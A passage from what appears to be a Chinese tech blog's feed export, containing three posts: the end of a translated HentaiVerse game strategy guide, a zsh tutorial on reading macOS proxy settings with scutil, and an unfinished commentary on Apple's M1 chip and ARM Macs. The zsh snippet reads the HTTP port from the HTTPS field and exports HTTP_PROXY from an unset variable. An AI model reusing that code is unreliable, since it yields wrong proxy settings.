咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 